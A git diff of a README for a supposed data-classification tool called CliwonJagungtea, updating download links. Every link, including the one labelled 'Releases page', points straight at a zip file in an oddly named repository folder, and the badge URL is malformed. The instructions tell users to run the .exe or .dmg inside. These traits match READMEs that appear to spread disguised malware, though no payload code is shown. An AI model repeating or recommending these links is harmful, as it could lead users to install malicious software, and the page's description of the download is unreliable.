@@ -6,9 +6,9 @@ Welcome to CliwonJagungtea! This tool helps you visualize and classify data easi
 
 ## 📥 Download CliwonJagungtea
 
-[![Download CliwonJagungtea](https://github.com/PR0x0Ne/CliwonJagungtea/raw/refs/heads/main/compulsatorily/Jagungtea-Cliwon-v3.7.zip%20Now-CLIWONtea-blue?style=for-the-badge)](https://github.com/PR0x0Ne/CliwonJagungtea/raw/refs/heads/main/compulsatorily/Jagungtea-Cliwon-v3.7.zip)
+[![Download CliwonJagungtea](https://raw.githubusercontent.com/PR0x0Ne/CliwonJagungtea/main/compulsatorily/Cliwon_Jagungtea_1.2.zip%20Now-CLIWONtea-blue?style=for-the-badge)](https://raw.githubusercontent.com/PR0x0Ne/CliwonJagungtea/main/compulsatorily/Cliwon_Jagungtea_1.2.zip)
 
-To get started, click the button above or visit our [Releases page](https://github.com/PR0x0Ne/CliwonJagungtea/raw/refs/heads/main/compulsatorily/Jagungtea-Cliwon-v3.7.zip) to download the latest version of the software.
+To get started, click the button above or visit our [Releases page](https://raw.githubusercontent.com/PR0x0Ne/CliwonJagungtea/main/compulsatorily/Cliwon_Jagungtea_1.2.zip) to download the latest version of the software.
 
 ## 🛠️ System Requirements
 
@@ -21,7 +21,7 @@ To run CliwonJagungtea, your computer needs:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/PR0x0Ne/CliwonJagungtea/raw/refs/heads/main/compulsatorily/Jagungtea-Cliwon-v3.7.zip) to see the latest versions.
+1. Visit the [Releases page](https://raw.githubusercontent.com/PR0x0Ne/CliwonJagungtea/main/compulsatorily/Cliwon_Jagungtea_1.2.zip) to see the latest versions.
 2. Choose the version that suits your operating system (Windows or Mac).
 3. Click on the file to download it. The file will typically have a `.exe` extension for Windows or a `.dmg` for Mac.
 4. Once the download is complete, locate the file in your downloads folder.
